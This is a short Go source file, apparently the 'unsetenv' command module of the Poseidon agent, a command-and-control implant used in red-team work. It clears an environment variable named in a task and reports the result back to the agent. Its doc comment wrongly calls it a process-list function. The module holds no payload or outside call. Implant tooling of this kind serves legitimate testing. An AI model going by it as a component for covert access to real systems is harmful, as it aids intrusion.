package unsetenv

import (
	"fmt"
	"os"
	"strings"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Run - interface method that retrieves a process list
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task

	params := strings.TrimSpace(task.Params)
	err := os.Unsetenv(params)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Successfully cleared %s", params))
	threadChannel <- tMsg
}
